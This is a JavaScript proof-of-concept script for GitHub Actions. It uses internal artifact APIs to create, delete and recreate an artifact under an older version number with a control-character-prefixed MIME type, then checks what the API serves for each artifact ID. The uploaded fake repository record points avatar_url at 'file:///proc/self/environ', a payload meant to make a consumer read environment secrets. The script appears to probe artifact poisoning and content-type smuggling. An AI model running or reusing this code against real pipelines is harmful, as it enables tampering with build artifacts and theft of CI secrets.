import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const client = internalArtifactTwirpClient({maxAttempts: 1});
const backend = getBackendIdsFromToken();
const name = `repo-cassette-recreate-${process.env.GITHUB_RUN_ID}`;
const body = Buffer.from(JSON.stringify({
  full_name: 'repo/cassette',
  owner: {login: 'repo', avatar_url: 'file:///proc/self/environ'},
  description: 'controlled',
  stargazers_count: 0,
}));

async function createFinalize(version, mimeType) {
  const created = await client.CreateArtifact({
    ...backend,
    name,
    version,
    mimeType: StringValue.create({value: mimeType}),
  });
  if (!created.ok) throw new Error(`CreateArtifact v${version} returned not ok`);
  await new BlobClient(created.signedUploadUrl).getBlockBlobClient().uploadData(body, {
    blobHTTPHeaders: {blobContentType: 'application/json'},
  });
  const finalized = await client.FinalizeArtifact({...backend, name, size: String(body.length)});
  if (!finalized.ok) throw new Error(`FinalizeArtifact v${version} returned not ok`);
  return String(finalized.artifactId);
}

async function observe(artifactId) {
  const headers = {
    Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
    Accept: 'application/vnd.github.v3+json',
    'User-Agent': 'repo-cassette-recreate-probe',
  };
  const apiUrl = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`;
  const initial = await fetch(apiUrl, {headers, redirect: 'manual'});
  const location = initial.headers.get('location');
  const final = location ? await fetch(location) : initial;
  const finalBody = Buffer.from(await final.arrayBuffer());
  const finalType = final.headers.get('content-type') || '';
  return {
    artifactId,
    initialStatus: initial.status,
    hasLocation: Boolean(location),
    finalStatus: final.status,
    finalType,
    finalTypeCodePoints: Array.from(finalType, c => c.codePointAt(0)),
    bodyMatches: finalBody.equals(body),
    bodyLength: finalBody.length,
  };
}

const oldId = await createFinalize(7, 'application/json');
const beforeDelete = await observe(oldId);
const deleted = await client.DeleteArtifact({...backend, name});
if (!deleted.ok) throw new Error('DeleteArtifact returned not ok');
const newId = await createFinalize(6, '\u0085application/json');
const observations = [beforeDelete, await observe(oldId), await observe(newId)];
console.log('RECREATE_RESULT', JSON.stringify({
  oldId,
  deletedId: String(deleted.artifactId),
  newId,
  sameId: oldId === newId,
  observations,
}));
